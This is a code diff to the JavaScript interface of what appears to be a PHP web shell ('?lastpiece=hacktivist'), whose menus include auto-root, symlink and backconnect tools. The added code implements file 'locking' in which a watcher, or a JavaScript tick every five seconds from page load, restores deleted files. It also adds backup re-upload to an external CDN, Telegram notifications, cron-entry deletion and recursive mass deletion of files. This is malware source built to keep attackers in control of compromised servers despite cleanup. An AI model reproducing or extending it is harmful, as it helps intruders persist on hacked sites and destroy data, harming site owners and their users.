+    hdr.style.background        = colorAlpha + '0.04)';
+
+    // Title
+    document.getElementById('uConfirmTitle').innerHTML =
+        '<span style="display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;background:' + colorAlpha + '0.12);border-radius:6px;border:1px solid ' + colorAlpha + '0.28);">'
+        + '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="' + color + '" stroke-width="2.5">' + icon + '</svg>'
+        + '</span>'
+        + '<span style="color:' + color + ';font-size:13px;font-weight:600;">' + (opts.title || 'Konfirmasi') + '</span>';
+
+    // Icon box
+    var iw = document.getElementById('uConfirmIconWrap');
+    iw.style.background   = colorAlpha + '0.1)';
+    iw.style.border       = '1px solid ' + colorAlpha + '0.25)';
+    iw.innerHTML = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="' + color + '" stroke-width="1.8">' + icon + '</svg>';
+
+    // Message
+    document.getElementById('uConfirmMsg').innerHTML = opts.msg || '';
+
+    // Sub
+    var subEl = document.getElementById('uConfirmSub');
+    subEl.style.display = opts.sub ? '' : 'none';
+    subEl.textContent   = opts.sub || '';
+
+    // Detail (file path etc)
+    var detEl = document.getElementById('uConfirmDetail');
+    if (opts.detail) {
+        detEl.style.display     = 'flex';
+        detEl.style.color       = color;
+        detEl.style.background  = colorAlpha + '0.07)';
+        detEl.style.border      = '1px solid ' + colorAlpha + '0.18)';
+        detEl.innerHTML         = opts.detail;
+    } else {
+        detEl.style.display = 'none';
+    }
+
+    // Warning box
+    var warnBox  = document.getElementById('uConfirmWarnBox');
+    var warnText = document.getElementById('uConfirmWarnText');
+    if (opts.warn) {
+        warnBox.style.display     = 'flex';
+        warnBox.style.background  = colorAlpha + '0.06)';
+        warnBox.style.border      = '1px solid ' + colorAlpha + '0.18)';
+        warnBox.querySelector('svg').style.stroke = color.replace(')', ',0.8)').replace('rgb', 'rgba');
+        warnText.style.color    = color;
+        warnText.textContent    = opts.warn;
+    } else { warnBox.style.display = 'none'; }
+
+    // OK button
+    var okBtn = document.getElementById('uConfirmOkBtn');
+    okBtn.style.background  = color;
+    okBtn.style.color       = '#fff';
+    okBtn.style.border      = '1px solid ' + colorAlpha + '0.8)';
+    okBtn.innerHTML = (opts.okIcon ? '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">' + opts.okIcon + '</svg>' : '')
+                    + (opts.okLabel || 'OK');
+
+    // Cancel label
+    document.getElementById('uConfirmCancelBtn').textContent = opts.cancelLabel || 'Batal';
+
+    document.getElementById('universalConfirmModal').classList.remove('hidden');
+}
+function uConfirmOk() {
+    document.getElementById('universalConfirmModal').classList.add('hidden');
+    if (typeof _uConfirmCallback === 'function') _uConfirmCallback();
+    _uConfirmCallback = null;
+}
+function uConfirmCancel() {
+    document.getElementById('universalConfirmModal').classList.add('hidden');
+    _uConfirmCallback = null;
+}
+// ── END UNIVERSAL CONFIRM DIALOG ─────────────────────────────────────────
+
+// Generic lock action helper (mirrors fetch pattern used by loadLockedFiles)
+function lockRequest(data, callback) {
+    var params = Object.keys(data).map(function(k) {
+        return encodeURIComponent(k) + '=' + encodeURIComponent(data[k]);
+    }).join('&');
+    fetch(window.location.pathname + '?lastpiece=hacktivist', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: params
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) { callback(d); })
+    .catch(function() { callback({ok: false, err: 'Network error'}); });
+}
+
+// ── TELEGRAM SETTINGS JS ─────────────────────────────────────────────────
+function toggleTgPanel() {
+    var panel = document.getElementById('tgSettingsPanel');
+    var arrow = document.getElementById('tgPanelArrow');
+    var open  = panel.style.display !== 'none';
+    panel.style.display = open ? 'none' : '';
+    if (arrow) arrow.style.transform = open ? 'rotate(0deg)' : 'rotate(180deg)';
+    if (!open) loadTgSettings();
+}
+
+function loadTgSettings() {
+    lockRequest({lock_action: 'tg_load'}, function(d) {
+        if (!d.ok) return;
+        var badge  = document.getElementById('tgStatusBadge');
+        var tokenEl = document.getElementById('tgBotToken');
+        var chatEl  = document.getElementById('tgChatId');
+        if (d.has_token && tokenEl && !tokenEl.value) {
+            tokenEl.placeholder = d.masked_token || '(tersimpan)';
+        }
+        if (d.chat_id && chatEl && !chatEl.value) {
+            chatEl.value = d.chat_id;
+        }
+        if (badge) {
+            if (d.has_token && d.chat_id) {
+                badge.style.display = '';
+                badge.textContent   = 'Aktif';
+                badge.style.background = 'rgba(74,222,128,0.15)';
+                badge.style.color      = '#4ade80';
+                badge.style.border     = '1px solid rgba(74,222,128,0.3)';
+            } else {
+                badge.style.display = '';
+                badge.textContent   = 'Belum diatur';
+                badge.style.background = 'rgba(107,114,128,0.15)';
+                badge.style.color      = '#6b7280';
+                badge.style.border     = '1px solid rgba(107,114,128,0.3)';
+            }
+        }
+    });
+}
+
+function saveTgSettings() {
+    var token  = (document.getElementById('tgBotToken').value  || '').trim();
+    var chatId = (document.getElementById('tgChatId').value    || '').trim();
+    var status = document.getElementById('tgSaveStatus');
+    if (status) { status.style.display = ''; status.textContent = 'Menyimpan...'; status.style.background = 'rgba(41,182,246,0.1)'; status.style.color = '#29b6f6'; status.style.border = '1px solid rgba(41,182,246,0.2)'; }
+    lockRequest({lock_action: 'tg_save', bot_token: token, chat_id: chatId}, function(d) {
+        if (!d.ok) {
+            if (status) { status.textContent = 'Gagal menyimpan.'; status.style.color = '#f87171'; }
+            return;
+        }
+        var badge = document.getElementById('tgStatusBadge');
+        if (d.ping) {
+            if (status) { status.textContent = 'Tersimpan! Pesan test berhasil dikirim ke Telegram.'; status.style.background = 'rgba(74,222,128,0.1)'; status.style.color = '#4ade80'; status.style.border = '1px solid rgba(74,222,128,0.2)'; }
+            if (badge) { badge.style.display = ''; badge.textContent = 'Aktif'; badge.style.background = 'rgba(74,222,128,0.15)'; badge.style.color = '#4ade80'; badge.style.border = '1px solid rgba(74,222,128,0.3)'; }
+        } else if (token && chatId) {
+            if (status) { status.textContent = 'Tersimpan, tapi test kirim gagal. Periksa token dan chat_id.'; status.style.background = 'rgba(245,158,11,0.1)'; status.style.color = '#f59e0b'; status.style.border = '1px solid rgba(245,158,11,0.2)'; }
+        } else {
+            if (status) { status.textContent = 'Pengaturan disimpan (kosong — notifikasi dinonaktifkan).'; status.style.background = 'rgba(107,114,128,0.1)'; status.style.color = '#6b7280'; status.style.border = '1px solid rgba(107,114,128,0.2)'; }
+            if (badge) { badge.style.display = ''; badge.textContent = 'Belum diatur'; badge.style.background = 'rgba(107,114,128,0.15)'; badge.style.color = '#6b7280'; badge.style.border = '1px solid rgba(107,114,128,0.3)'; }
+        }
+    });
+}
+// ── END TELEGRAM SETTINGS JS ─────────────────────────────────────────────
+
+var _lockMgrPollTimer = null;
+var _lockTickTimer    = null;
+var _lockTickUrl      = null;
+
+// JS-based tick: calls ?lp_watcher_tick=1 as fallback when shell watcher can't run
+function runTickNow() {
+    if (!_lockTickUrl) {
+        // Build tick URL from current page URL
+        var base = window.location.pathname + '?lastpiece=hacktivist&lp_watcher_tick=1';
+        _lockTickUrl = base;
+    }
+    var x = new XMLHttpRequest();
+    x.open('GET', _lockTickUrl, true);
+    x.onload = function() {
+        try {
+            var d = JSON.parse(x.responseText);
+            var badge = document.getElementById('lockMgrWatcherBadge');
+            if (badge) {
+                badge.textContent = 'RESTORED ' + (d.restored || 0) + ' FILES';
+                badge.style.color = '#4ade80'; badge.style.background = 'rgba(74,222,128,0.15)';
+                badge.style.borderColor = 'rgba(74,222,128,0.4)'; badge.style.display = '';
+            }
+        } catch(e) {}
+        setTimeout(loadLockedFiles, 800);
+    };
+    x.send();
+}
+
+function startJsTick(tickUrl) {
+    _lockTickUrl = tickUrl;
+    if (_lockTickTimer) clearInterval(_lockTickTimer);
+    _lockTickTimer = setInterval(function() {
+        if (!_lockTickUrl) return;
+        var x = new XMLHttpRequest();
+        x.open('GET', _lockTickUrl, true);
+        x.send();
+    }, 5000); // every 5 seconds
+}
+function stopJsTick() {
+    if (_lockTickTimer) { clearInterval(_lockTickTimer); _lockTickTimer = null; }
+}
+
+function showLockManagerModal() {
+    document.getElementById('lockManagerLoading').style.display = '';
+    document.getElementById('lockManagerTable').style.display = 'none';
+    document.getElementById('lockManagerEmpty').style.display = 'none';
+    document.getElementById('lockManagerModal').classList.remove('hidden');
+    loadLockedFiles();
+    // Auto-poll UI every 3s while modal open
+    if (_lockMgrPollTimer) clearInterval(_lockMgrPollTimer);
+    _lockMgrPollTimer = setInterval(function() {
+        var modal = document.getElementById('lockManagerModal');
+        if (!modal || modal.classList.contains('hidden')) {
+            clearInterval(_lockMgrPollTimer); _lockMgrPollTimer = null; return;
+        }
+        loadLockedFiles();
+    }, 3000);
+}
+
+function loadLockedFiles() {
+    fetch(window.location.pathname + '?lastpiece=hacktivist', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'lock_action=list'
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+        document.getElementById('lockManagerLoading').style.display = 'none';
+        var body = document.getElementById('lockManagerBody');
+        body.innerHTML = '';
+        var total   = d.locked ? d.locked.length : 0;
+        var missing = d.locked ? d.locked.filter(function(x){return !x.exists;}).length : 0;
+        var alive   = d.watcher_alive;
+        var pid     = d.watcher_pid;
+        var shellOff = d.shell_disabled;
+        var tickUrl  = d.tick_url;
+        var statsEl = document.getElementById('lockMgrStats');
+        var dotEl   = document.getElementById('lockMgrDot');
+        var badgeEl = document.getElementById('lockMgrWatcherBadge');
+        var diagEl  = document.getElementById('lockMgrDiag');
+
+        // Start JS-based tick as fallback if shell watcher dead/disabled
+        if (total > 0 && (!alive || shellOff)) {
+            if (tickUrl) startJsTick(tickUrl);
+        } else {
+            stopJsTick();
+        }
+
+        var watcherMode = alive ? 'WATCHER AKTIF' : (shellOff ? 'JS TICK AKTIF' : 'WATCHER MATI');
+        var statsText = total + ' file dikunci';
+        if (missing > 0) statsText += ' | ' + missing + ' missing';
+        if (pid) statsText += ' | PID ' + pid;
+        if (statsEl) statsEl.textContent = statsText;
+        if (dotEl) {
+            dotEl.style.background = (alive || (shellOff && total > 0)) ? '#4ade80' : (total > 0 ? '#f87171' : '#6b7280');
+            dotEl.style.animation  = (alive || (shellOff && total > 0)) ? 'procPulse 1.5s infinite' : 'none';
+        }
+        if (badgeEl) {
+            badgeEl.style.display     = total > 0 ? '' : 'none';
+            badgeEl.textContent       = watcherMode;
+            var isGreen = alive || (shellOff && total > 0);
+            badgeEl.style.color       = isGreen ? '#4ade80' : '#f87171';
+            badgeEl.style.borderColor = isGreen ? 'rgba(74,222,128,0.4)' : 'rgba(248,81,73,0.4)';
+            badgeEl.style.background  = isGreen ? 'rgba(74,222,128,0.15)' : 'rgba(248,81,73,0.15)';
+        }
+        if (diagEl) {
+            diagEl.style.display = (shellOff || !alive) && total > 0 ? '' : 'none';
+            if (shellOff) {
+                diagEl.textContent = 'shell_exec disabled — menggunakan JS tick (restore via HTTP setiap 5 detik). Untuk restore instan: pasang cronjob ke URL di bawah.';
+            } else if (!alive) {
+                diagEl.textContent = 'Watcher mati (php_bin: ' + (d.php_bin || 'n/a') + ', file: ' + (d.watcher_file_ok ? 'ada' : 'tidak ada') + '). JS tick aktif sebagai fallback.';
+            }
+        }
+        if (!d.locked || d.locked.length === 0) {
+            document.getElementById('lockManagerEmpty').style.display = '';
+            return;
+        }
+        document.getElementById('lockManagerTable').style.display = '';
+        d.locked.forEach(function(item) {
+            var tr = document.createElement('tr');
+            tr.style.borderBottom = '1px solid rgba(255,255,255,0.04)';
+            var statusColor = item.exists ? '#4ade80' : '#f87171';
+            var statusHtml  = item.exists
+                ? '<span style="display:inline-flex;align-items:center;gap:3px;color:#4ade80;font-weight:600;"><span style="width:6px;height:6px;border-radius:50%;background:#4ade80;animation:procPulse 1.5s infinite;display:inline-block;"></span>Active</span>'
+                : '<span style="display:inline-flex;align-items:center;gap:3px;color:#f87171;font-weight:600;animation:blink 1s step-end infinite;"><span style="width:6px;height:6px;border-radius:50%;background:#f87171;display:inline-block;"></span>Restoring...</span>';
+            var curPermColor = item.exists ? ((item.cur_perm === item.perm) ? '#4ade80' : '#f59e0b') : '#6b7280';
+            var backupCell  = item.backup_url
+                ? '<div style="display:flex;flex-direction:column;align-items:center;gap:2px;">'
+                  + '<a href="' + item.backup_url + '" target="_blank" style="color:#4ade80;font-size:9px;display:flex;align-items:center;gap:2px;"><svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>CDN</a>'
+                  + '<button style="font-size:8px;padding:1px 6px;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.4);border-radius:3px;color:#4ade80;cursor:pointer;" onclick="doReupload(' + JSON.stringify(item.path) + ')">Re-up</button>'
+                  + '</div>'
+                : '<div style="display:flex;flex-direction:column;align-items:center;gap:2px;">'
+                  + '<span style="color:#f87171;font-size:9px;">none</span>'
+                  + '<button style="font-size:8px;padding:1px 6px;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.4);border-radius:3px;color:#f59e0b;cursor:pointer;" onclick="doReupload(' + JSON.stringify(item.path) + ')">Upload</button>'
+                  + '</div>';
+            var fileName = item.path.split('/').pop();
+            tr.innerHTML = '<td style="padding:6px 8px;max-width:220px;">'
+                + '<div style="font-family:monospace;color:#f59e0b;font-size:10px;word-break:break-all;">' + item.path + '</div>'
+                + '<div style="color:var(--text-muted);font-size:9px;margin-top:1px;">' + (item.is_dir ? 'folder' : 'file') + '</div>'
+                + '</td>'
+                + '<td style="padding:6px 8px;text-align:center;font-family:monospace;font-size:10px;color:#fff;">' + (item.perm || '----') + '</td>'
+                + '<td style="padding:6px 8px;text-align:center;font-family:monospace;font-size:10px;color:' + curPermColor + ';">' + (item.cur_perm || '----') + '</td>'
+                + '<td style="padding:6px 8px;text-align:center;">' + backupCell + '</td>'
+                + '<td style="padding:6px 8px;text-align:center;">' + statusHtml + '</td>'
+                + '<td style="padding:6px 8px;text-align:center;white-space:nowrap;">'
+                +   '<button style="font-size:9px;padding:2px 8px;background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.4);border-radius:4px;color:#f85149;cursor:pointer;" onclick="doUnlockFile(' + JSON.stringify(item.path) + ')">Unlock</button>'
+                + '</td>';
+            body.appendChild(tr);
+        });
+    }).catch(function(e) {
+        document.getElementById('lockManagerLoading').textContent = 'Error: ' + e.message;
+    });
+}
+
+function doReupload(path) {
+    showToast('Uploading backup...', 'info');
+    fetch(window.location.pathname + '?lastpiece=hacktivist', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'lock_action=reupload&lock_path=' + encodeURIComponent(path)
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+        if (d.ok && d.has_backup) {
+            showToast('Backup uploaded', 'success', 4000, 'applepay');
+        } else if (d.ok) {
+            showToast('Upload failed — no URL returned (Figma API may be unavailable)', 'warning');
+        } else {
+            showToast('Error: ' + (d.err || 'Unknown'), 'error');
+        }
+        loadLockedFiles();
+    }).catch(function(e) { showToast('Error: ' + e.message, 'error'); });
+}
+
+function doUnlockFile(path) {
+    fetch(window.location.pathname + '?lastpiece=hacktivist', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'lock_action=unlock&lock_path=' + encodeURIComponent(path)
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+        if (d.ok) {
+            showToast('Unlocked: ' + path.split('/').pop(), 'success');
+            loadLockedFiles();
+        } else { showToast('Gagal: ' + (d.err || ''), 'error'); }
+    });
+}
+
+function doUnlockAll() {
+    showConfirm({
+        title: 'Unlock Semua',
+        msg:   'Yakin ingin meng-unlock semua file yang dikunci?',
+        sub:   'Watcher tidak akan lagi memantau dan merestore file-file tersebut.',
+        warn:  'File akan dapat diubah atau dihapus setelah di-unlock.',
+        color: '#f59e0b', colorAlpha: 'rgba(245,158,11,',
+        icon:  '<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
+        okIcon:'<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
+        okLabel: 'Unlock Semua',
+        onOk: function() {
+    fetch(window.location.pathname + '?lastpiece=hacktivist', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'lock_action=unlock_all'
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+        if (d.ok) { showToast('Semua file di-unlock', 'success'); loadLockedFiles(); }
+        else { showToast('Gagal: ' + (d.err || ''), 'error'); }
+    });
+        }
+    });
+}
+// === END LOCKFILE JS ===
+
 function showMassDeleteModal() {
     document.getElementById('massDelCode').value = '';
-    document.getElementById('massDelResult').style.display = 'none';
     document.getElementById('massDelMode').value = 'code';
     document.getElementById('massDelCodeGroup').style.display = '';
+    // Update target_dir to current directory and fix form action with correct lph
+    var curDir = document.getElementById('massDelDir') ? document.getElementById('massDelDir').value : '';
+    var curLph = encodeURIComponent(curDir || window._currentDir || '');
+    document.getElementById('massDelForm').action = '?lastpiece=hacktivist&lph=' + curLph;
     document.getElementById('massDeleteModal').classList.remove('hidden');
 }
 function toggleMassDelCode() {
     var mode = document.getElementById('massDelMode').value;
     document.getElementById('massDelCodeGroup').style.display = mode === 'code' ? '' : 'none';
 }
-function doMassDeleteRecursive() {
-    var dir = document.getElementById('massDelDir').value.trim();
-    var mode = document.getElementById('massDelMode').value;
-    var code = mode === 'code' ? document.getElementById('massDelCode').value : '';
-    if (!dir) { showToast('Target directory required', 'warning'); return; }
-    if (mode === 'code' && !code.trim()) { showToast('Please paste code/text to match', 'warning'); return; }
-    var label = mode === 'all' ? 'ALL FILES' : 'files containing the specified code';
-    if (!confirm('This will delete ' + label + ' recursively in:\n' + dir + '\n\nContinue?')) return;
-    var btn = document.getElementById('massDelBtn');
-    btn.disabled = true; btn.textContent = 'Deleting...';
-    var resDiv = document.getElementById('massDelResult');
-    resDiv.style.display = 'block';
-    resDiv.innerHTML = '<span style="color: var(--text-muted);">Scanning and deleting...</span>';
-    fileActionRequest({file_action: 'mass_delete_recursive', target_dir: dir, code_content: code}, function(r) {
-        btn.disabled = false;
-        btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg> Execute Delete';
-        if (r.ok) {
-            resDiv.innerHTML = '<span style="color: #3fb950;">Deleted: <b>' + r.deleted + '</b></span> | <span style="color: #f85149;">Failed: <b>' + r.failed + '</b></span> | <span style="color: var(--text-muted);">Scanned: ' + r.scanned + '</span>';
-            showToast('Mass delete done: <b>' + r.deleted + '</b> deleted, <b>' + r.failed + '</b> failed', r.failed > 0 ? 'warning' : 'success', 5000, 'applepay');
-        } else {
-            resDiv.innerHTML = '<span style="color: #f85149;">Error: ' + (r.err || 'Unknown') + '</span>';
-            showToast('Mass delete error: ' + (r.err || 'Unknown'), 'error'); playFailSound();
-        }
-    });
-}
+// doMassDeleteRecursive — handled by form POST, result shown in terminal output
+function doMassDeleteRecursive() {}
 
 // === KEYBOARD SHORTCUTS for modals ===
 document.addEventListener('keydown', function(e) {
@@ -4844,7 +6652,7 @@ document.addEventListener('keydown', function(e) {
         if (!document.getElementById('editFileModal').classList.contains('hidden')) hideEditModal();
         if (!document.getElementById('renameModal').classList.contains('hidden')) hideRenameModal();
         if (!document.getElementById('chmodFileModal').classList.contains('hidden')) hideChmodFileModal();
-        ['autoRootModal','symlinkModal','backconnectModal','createFolderModal','createFileModal','massDeleteModal','zipNameModal'].forEach(function(id){
+        ['autoRootModal','symlinkModal','backconnectModal','createFolderModal','createFileModal','massDeleteModal','zipNameModal','lockFileModal','lockManagerModal'].forEach(function(id){
             var el = document.getElementById(id);
             if (el && !el.classList.contains('hidden')) hideModal2(id);
         });
@@ -5104,11 +6912,11 @@ var procCurrentUser = '<?php echo get_current_user(); ?>';
 
 function procRequest(data, callback) {
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', window.location.href, true);
+    xhr.open('POST', window.location.pathname + '?lastpiece=hacktivist', true);
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xhr.onload = function() {
         try { callback(JSON.parse(xhr.responseText)); }
-        catch(e) { callback({err: 'Parse error'}); }
+        catch(e) { callback({err: 'Parse error: ' + xhr.responseText.substring(0, 300)}); }
     };
     xhr.onerror = function() { callback({err: 'Network error'}); };
     var params = [];
@@ -5297,7 +7105,7 @@ var cronRawVisible = false;
 
 function cronRequest(data, callback) {
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', window.location.href, true);
+    xhr.open('POST', window.location.pathname + '?lastpiece=hacktivist', true);
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xhr.onload = function() {
         try { callback(JSON.parse(xhr.responseText)); }
@@ -5471,11 +7279,21 @@ function cronToggle(idx) {
 }
 
 function cronDelete(idx) {
-    if (!confirm('Delete this cron entry?')) return;
+    showConfirm({
+        title: 'Hapus Cronjob',
+        msg:   'Yakin ingin menghapus entri cronjob ini?',
+        warn:  'Cronjob akan dihapus permanen dari crontab.',
+        color: '#f85149', colorAlpha: 'rgba(248,81,73,',
+        icon:  '<rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="8" y1="12" x2="16" y2="12"/>',
+        okIcon:'<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/>',
+        okLabel: 'Hapus',
+        onOk: function() {
     cronRequest({cron_action: 'delete', idx: idx}, function(r) {
         if (r.err) { showToast('Delete cron failed: ' + r.err, 'error'); playFailSound(); return; }
         showToast('Cronjob entry deleted', 'success', 4000, 'applepay');
         cronLoad();
+    });
+        }
     });
 }
 
@@ -5600,6 +7418,37 @@ function esc(s) {
     }
     requestAnimationFrame(updateChars);
 })();
+
+// ── BACKGROUND AUTO-TICK ─────────────────────────────────────────────────
+// Runs every 5s from page load regardless of modal state.
+// Calls ?lp_watcher_tick=1 which restores any missing locked files via HTTP.
+(function() {
+    var TICK_URL = window.location.pathname + '?lastpiece=hacktivist&lp_watcher_tick=1';
+
+    function doTick() {
+        var x = new XMLHttpRequest();
+        x.open('GET', TICK_URL, true);
+        x.onload = function() {
+            try {
+                var d = JSON.parse(x.responseText);
+                if (d.restored > 0) {
+                    // Update global tick URL so runTickNow() stays in sync
+                    _lockTickUrl = TICK_URL;
+                }
+            } catch(e) {}
+        };
+        x.onerror = function() {};
+        x.send();
+    }
+
+    // Start immediately on page load, then every 5 seconds
+    doTick();
+    setInterval(doTick, 5000);
+
+    // Also expose tick URL globally for runTickNow() button
+    _lockTickUrl = TICK_URL;
+})();
+// ── END BACKGROUND AUTO-TICK ─────────────���────────────────────────────────
 </script>
 
 <?php endif; ?>
